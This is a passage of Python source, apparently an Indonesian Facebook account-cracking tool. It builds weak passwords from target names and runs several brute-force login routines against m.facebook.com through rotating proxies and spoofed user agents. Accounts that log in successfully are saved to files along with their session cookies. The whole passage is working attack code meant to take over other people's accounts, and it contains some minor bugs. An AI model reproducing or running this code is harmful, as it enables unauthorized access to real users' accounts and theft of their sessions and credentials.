    prog = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(),
                    TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('', total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = []
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '321')
                        pwv.append(frs + '02')
                        pwv.append(frs + '03')
                        pwv.append(frs + '04')
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '321')
                        pwv.append(frs + '02')
                        pwv.append(frs + '03')
                        pwv.append(frs + '04')
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:
                    pass
                if 'mobile' in method:
                    pool.submit(metod1, idf, pwv)
                elif 'mbasic' in method:
                    pool.submit(metod2, idf, pwv)
                elif 'asyinc' in method:
                    pool.submit(metod3, idf, pwv)
                elif 'mbeta' in method:
                    pool.submit(metod4, idf, pwv)
                else:
                    pool.sumbit(metod1, idf, pwv)
    kopi()
    print(f'{kun}└──{x}[{hijo}•{x}] OK {hijo}: %s' % (ok))
    print(f'{kun}└──{x}[{hijo}•{x}] CP {kun}: %s' % (cp))


# ----------[ METODE-VALIDATE ]----------#
def metod1(idf, pwv):
    global loop, ok, cp
    prog.update(des, description=f"[green]𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐞[white] {loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
    prog.advance(des)
    ua = random.choice(ugen)
    ua2 = random.choice([
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'sec-ch-ua-mobile': '?1',
                                'upgrade-insecure-requests': '1', 'user-agent': ua,
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty',
                                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get(
                'https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), "uid": idf,
                     "next": "https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
                     "flow": "login_no_pin", "pass": pw, }
            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0',
                     'sec-ch-ua': '" Not A;Brand";v="{str(rr(8,99))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                     'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'upgrade-insecure-requests': '1',
                     'origin': 'https://m.facebook.com', 'content-type': 'application/x-www-form-urlencoded',
                     'user-agent': ua,
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                     'x-requested-with': 'XMLHttpRequest', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors',
                     'sec-fetch-dest': 'empty',
                     'referer': 'https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                     'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',
                          data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print('')
                tree = Tree('')
                os.system('play-audio CP.mp3')
                tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
                tree.add(f'{puti}{ua}{x}')
                print('')
                prints(tree)
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                kukis = kuki.replace(f'c_user={idf};datr', 'sb')
                os.system("play-audio OK.mp3")

                print('')
                tree = Tree("")
                tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
                tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
                print('')
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                cek_apk(kuki)
                break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


# ----------[ METODE-MBASIC ]----------#
def metod2(idf, pwv):
    global loop, ok, cp
    prog.update(des, description=f"[green]𝐌𝐛𝐚𝐬𝐢𝐜[white] {loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
    prog.advance(des)
    ua = random.choice(ugen)
    ua2 = random.choice([
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'sec-ch-ua-mobile': '?1',
                                'upgrade-insecure-requests': '1', 'user-agent': ua,
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty',
                                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get(
                'https://m.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1688124887898%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df34dad1c35380e%2526domain%253Dwww.pointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.pointblank.id%25252Ff3e8361fb6fd6bc%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dwww.pointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.pointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1eeb8852b5e26c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd4e17e005bf1c%2526domain%253Dwww.pointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.pointblank.id%25252Ff3e8361fb6fd6bc%2526relation%253Dopener%2526frame%253Df3694fc1c71858%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfd4e17e005bf1c%26domain%3Dwww.pointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.pointblank.id%252Ff3e8361fb6fd6bc%26relation%3Dopener%26frame%3Df3694fc1c71858%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), "uid": idf,
                     "next": "https://m.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1688124887898%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df34dad1c35380e%2526domain%253Dwww.pointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.pointblank.id%25252Ff3e8361fb6fd6bc%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dwww.pointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.pointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1eeb8852b5e26c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd4e17e005bf1c%2526domain%253Dwww.pointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.pointblank.id%25252Ff3e8361fb6fd6bc%2526relation%253Dopener%2526frame%253Df3694fc1c71858%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfd4e17e005bf1c%26domain%3Dwww.pointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.pointblank.id%252Ff3e8361fb6fd6bc%26relation%3Dopener%26frame%3Df3694fc1c71858%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                     "flow": "login_no_pin", "pass": pw, }
            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0',
                     'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"', 'sec-ch-ua-mobile': '?1',
                     'sec-ch-ua-platform': '"Android"', 'upgrade-insecure-requests': '1',
                     'origin': 'https://m.facebook.com', 'content-type': 'application/x-www-form-urlencoded',
                     'user-agent': ua,
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                     'x-requested-with': 'XMLHttpRequest', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors',
                     'sec-fetch-dest': 'empty',
                     'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1688124887898%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df34dad1c35380e%2526domain%253Dwww.pointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.pointblank.id%25252Ff3e8361fb6fd6bc%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dwww.pointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.pointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1eeb8852b5e26c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd4e17e005bf1c%2526domain%253Dwww.pointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.pointblank.id%25252Ff3e8361fb6fd6bc%2526relation%253Dopener%2526frame%253Df3694fc1c71858%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfd4e17e005bf1c%26domain%3Dwww.pointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.pointblank.id%252Ff3e8361fb6fd6bc%26relation%3Dopener%26frame%3Df3694fc1c71858%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                     'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',
                          data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print('')
                tree = Tree('')
                os.system('play-audio CP.mp3')
                tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
                tree.add(f'{mer}{ua}{x}')
                print('')
                prints(tree)
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                kukis = kuki.replace(f'c_user={idf};datr', 'sb')
                os.system("play-audio OK.mp3")

                print('')
                tree = Tree("")
                tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
                tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
                print('')
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                cek_apk(kuki)
                break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


# ----------[ METODE-ASYINC ]----------#
def metod3(idf, pwv):
    global loop, ok, cp
    prog.update(des, description=f"[green]𝐀𝐬𝐲𝐧𝐜[white] {loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
    prog.advance(des)
    ua = random.choice(ugen)
    ua2 = random.choice([
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({"Host": "m.facebook.com", "cache-control": "max-age=0", "user-agent": ua,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "sec-ch-ua": '" Not A;Brand";v="{str(rr(8,99))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                                "sec-ch-ua-mobile": "?1", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors",
                                "sec-fetch-dest": "empty", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1",
                                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get(
                "https://m.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
            dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                     'm_ts': re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),
                     'li': re.search('name="li" value="(.*?)"', str(p.text)).group(1), 'try_number': '0',
                     'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '',
                     'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '',
                     'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false',
                     'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"', str(p.text)).group(1)}
            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {"Host": "m.facebook.com", "content-length": f"{len(str(dataa))}",
                     "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     "origin": "https://m.facebook.com", "content-type": "application/x-www-form-urlencoded",
                     "user-agent": ua, "accept": "*/*", "x-requested-with": "com.microsoft.bing",
                     "sec-ch-ua": '"Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Not;A=Brand";v="{str(rr(8,99))}.0.0.0"',
                     "sec-ch-ua-platform": '"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"',
                     "sec-ch-ua-mobile": "?1", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors",
                     "sec-fetch-dest": "empty", "sec-fetch-user": "?1",
                     "referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
                     "accept-encoding": "gzip, deflate br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                     }
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
                          data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print('')
                tree = Tree('')
                tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
                tree.add(f'{puti}{ua}{x}')
                os.system('play-audio CP.mp3')
                print('')
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                kukis = kuki.replace(f'c_user={idf};datr', 'sb')
                os.system("play-audio OK.mp3")

                print('')
                tree = Tree("")
                tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
                tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
                print('')
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                cek_apk(kuki)
                break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


# ----------[ HOST-M-BETA ]----------#
def metod4(idf, pwv):
    global loop, ok, cp
    prog.update(des, description=f"[green]𝐑𝐞𝐠𝐮𝐥𝐚𝐫 𝐕𝟐[white] {loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
    prog.advance(des)
    ua = random.choice(ugen)
    ua2 = random.choice([
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'sec-ch-ua-mobile': '?1',
                                'upgrade-insecure-requests': '1', 'user-agent': ua,
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty',
                                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get(
